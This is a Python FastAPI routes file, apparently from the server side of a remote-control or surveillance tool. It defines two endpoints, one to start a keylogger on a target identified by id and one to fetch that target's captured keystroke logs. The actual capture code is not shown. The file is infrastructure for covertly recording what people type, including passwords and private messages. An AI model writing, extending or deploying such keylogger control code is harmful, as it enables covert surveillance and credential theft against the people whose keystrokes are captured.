# api/routes/keyloggerRoutes.py
from fastapi import APIRouter, Depends, Query, Request
from api.service.keyloggerService import KeyloggerService

router = APIRouter()

def get_keylogger_service(request: Request) -> KeyloggerService:
    data_manager = request.app.state.app_state.data_manager
    return KeyloggerService(data_manager.user_repository, data_manager.lock)

@router.get("/api/modules/keylogger/logs")
async def get_keylogger_logs(id: str = Query(None), keylogger_service: KeyloggerService = Depends(get_keylogger_service)):
    return keylogger_service.getKeyloggerLogs(id)

@router.post("/api/modules/keylogger/start")
async def start_keylogger(id: str = Query(None), keylogger_service: KeyloggerService = Depends(get_keylogger_service)):
    return keylogger_service.startKeylogger(id)
